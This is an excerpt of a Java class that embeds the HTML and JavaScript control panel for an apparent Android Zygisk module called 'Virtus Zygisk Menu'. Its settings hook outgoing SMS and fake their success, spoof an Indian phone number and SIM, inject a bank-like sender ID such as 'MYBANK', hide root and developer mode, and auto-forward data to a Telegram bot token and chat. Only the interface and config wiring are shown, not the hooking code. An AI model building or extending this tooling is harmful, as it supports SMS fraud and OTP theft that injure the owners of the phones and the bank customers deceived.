...
public class HivirtusUiHelper {
    ...
    private static final String EMBEDDED_MENU_HTML =
            ...
            + "html,body{height:100%;background:transparent;color:#eaeaea;font-family:sans-serif}"
            + "body{display:flex}"
            + ".shell{flex:1;height:100%;display:flex;flex-direction:column;padding:16px;"
            + "border-radius:22px;background:radial-gradient(120% 80% at 0% 0%,rgba(108,99,255,.16),transparent 55%),"
            + "linear-gradient(165deg,#121428,#090b12);border:1px solid rgba(108,99,255,.28)}"
            + ".top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}"
            + ".name{font-weight:700;font-size:16px}.sub{font-size:12px;font-weight:600}"
            + ".sub.on{color:#00c896}.sub.off{color:#ff4757}"
            + ".brand{display:flex;gap:12px;align-items:center}"
            + ".mark,.mark-img{width:42px;height:42px;border-radius:50%;object-fit:cover;display:grid;place-items:center;"
            + "background:linear-gradient(145deg,#5c6bc0,#1a237e);color:#fff;font-weight:700}"
            + ".pills{display:flex;gap:8px;margin-bottom:12px}"
            + ".pill{display:inline-flex;align-items:center;gap:6px;padding:6px 10px;border-radius:999px;font-size:11px;font-weight:700;"
            + "border:1px solid rgba(108,99,255,.18)}"
            + ".pill i{width:7px;height:7px;border-radius:50%;display:inline-block}"
            + ".pill.on{color:#eaeaea;background:rgba(0,200,150,.1);border-color:rgba(0,200,150,.35)}.pill.on i{background:#00c896}"
            + ".pill.off{color:#c9c9d4;background:rgba(255,71,87,.08);border-color:rgba(255,71,87,.28)}.pill.off i{background:#ff4757}"
            + ".card{background:rgba(19,21,31,.94);border-radius:16px;padding:14px;margin-bottom:14px;border:1px solid rgba(108,99,255,.18)}"
            + "h3{font-size:14px;margin-bottom:2px}p{font-size:12px;font-weight:600}.on{color:#00c896}.off{color:#ff4757}"
            + "input[type=text],input[type=tel]{width:100%;margin-top:10px;padding:12px;border-radius:10px;border:0;background:#05070f;color:#fff}"
            + ".row{display:flex;align-items:center;justify-content:space-between;gap:10px}"
            + ".credit{display:block;text-align:center;margin-top:8px;color:#6b7190;font-size:11px}"
            + "</style></head><body><div class=shell>"
            + "<div class=top><div class=brand><span class=mark>V</span>"
            + "<div><div class=name>Virtus Zygisk Menu</div><div class=sub off id=statusLine>off</div></div></div></div>"
            + "<div class=pills>"
            + "<span class='pill off' id=pillPhone><i></i>Phone</span>"
            + "<span class='pill off' id=pillIntercept><i></i>Intercept</span>"
            + "<span class='pill off' id=pillTg><i></i>Telegram</span></div>"
            + "<div class=card><div class=row><div><h3>Fake Phone Number</h3><p id=fakeHint class=off>Fake no off</p></div>"
            + "<input type=checkbox id=swF></div><input type=tel id=phone placeholder='+91 XXXXX XXXXX'></div>"
            + "<div class=card><div class=row><div><h3>Incoming Sender ID</h3><p id=senderHint class=off>Sender id off</p></div>"
            + "<input type=checkbox id=swS></div><input type=text id=sender placeholder='MYBANK'></div>"
            + "<div class=card><div class=row><div><h3>Intercept & Fake Success</h3><p id=interceptHint class=off>Intercept off</p></div>"
            + "<input type=checkbox id=swI checked></div></div>"
            + "<div class=card><div class=row><div><h3>Iam not root</h3><p id=rootHint class=off>off</p></div>"
            + "<input type=checkbox id=swR></div></div>"
            + "<div class=card><div class=row><div><h3>iam not developer</h3><p id=devHint class=off>off</p></div>"
            + "<input type=checkbox id=swD></div></div>"
            + "<div class=card><div class=row><div><h3>Telegram</h3><p id=tgHint class=off>Telegram off</p></div>"
            + "<input type=checkbox id=swT></div>"
            ...
            + "<script>(function(){var H=window.Hivirtus;var t;"
            + "function setPill(id,on){var e=document.getElementById(id);if(!e)return;e.className='pill '+(on?'on':'off');}"
            + "function setHint(id,on,a,b){var e=document.getElementById(id);if(!e)return;e.textContent=on?a:b;e.className=on?'on':'off';}"
            + "function paint(){var on=document.getElementById('swI').checked;"
            + "var fake=document.getElementById('swF').checked||!!(document.getElementById('phone').value||'').replace(/\\D/g,'').length>=10;"
            + "var sid=document.getElementById('swS').checked||!!(document.getElementById('sender').value||'').trim();"
            + "var tg=document.getElementById('swT').checked||!!(document.getElementById('token').value&&document.getElementById('chat').value);"
            + "document.getElementById('statusLine').textContent=on?'Intercept on':'off';"
            + "document.getElementById('statusLine').className='sub '+(on?'on':'off');"
            + "setHint('interceptHint',on,'Intercept on','Intercept off');"
            + "setHint('fakeHint',fake,'Fake no on','Fake no off');"
            + "setHint('senderHint',sid,'Sender id on','Sender id off');"
            + "setHint('tgHint',tg,'Telegram on','Telegram off');"
            + "setHint('rootHint',document.getElementById('swR').checked,'on','off');"
            + "setHint('devHint',document.getElementById('swD').checked,'on','off');"
            + "setPill('pillPhone',fake);setPill('pillIntercept',on);setPill('pillTg',tg);}"
            + "function save(){var on=document.getElementById('swI').checked;var phone=document.getElementById('phone').value||'';"
            + "var dig=phone.replace(/\\D/g,'');if(dig.length>10)dig=dig.slice(-10);if(dig.length>=10)phone='+91'+dig;"
            + "var j=JSON.stringify({hook_outgoing_sms:true,intercept_fake_success:on,intercept_enabled:on,"
            + "enable_sim1_mock:document.getElementById('swF').checked||dig.length>=10,"
            + "enable_phone_spoof:document.getElementById('swF').checked||dig.length>=10,"
            + "enable_virtual_sim:dig.length>=10,fake_number_enabled:document.getElementById('swF').checked||dig.length>=10,"
            + "mock_phone_sim1:phone,inject_sender_id:document.getElementById('sender').value||'',"
            + "hide_root:document.getElementById('swR').checked,hide_developer:document.getElementById('swD').checked,"
            + "telegram_bot_token:document.getElementById('token').value||'',"
            + "telegram_chat_id:document.getElementById('chat').value||'',"
            + "auto_forward_token:!!(document.getElementById('token').value&&document.getElementById('chat').value)||document.getElementById('swT').checked,"
            + "telegram_enabled:!!(document.getElementById('token').value&&document.getElementById('chat').value)||document.getElementById('swT').checked,"
            + "override_incoming_sender:document.getElementById('swS').checked||!!document.getElementById('sender').value});"
            + "try{if(H)H.saveConfig(j);paint();}catch(e){}}"
            + "function schedule(){paint();clearTimeout(t);t=setTimeout(save,400);}"
            ...
            + "if(c.inject_sender_id){document.getElementById('sender').value=c.inject_sender_id;document.getElementById('swS').checked=true;}"
            ...
            + "if(c.hide_root)document.getElementById('swR').checked=true;"
            + "if(c.hide_developer)document.getElementById('swD').checked=true;"
            + "if(c.auto_forward_token||c.telegram_enabled)document.getElementById('swT').checked=true;"
            + "if(c.intercept_fake_success===false||c.intercept_enabled===false)document.getElementById('swI').checked=false;}}catch(e){}"
            + "['swF','swS','swI','swR','swD','swT','phone','sender','token','chat'].forEach(function(id){"
            + "var e=document.getElementById(id);if(!e)return;e.onchange=schedule;e.oninput=schedule;});"
            + "paint();})();</script>"
            + "</body></html>";
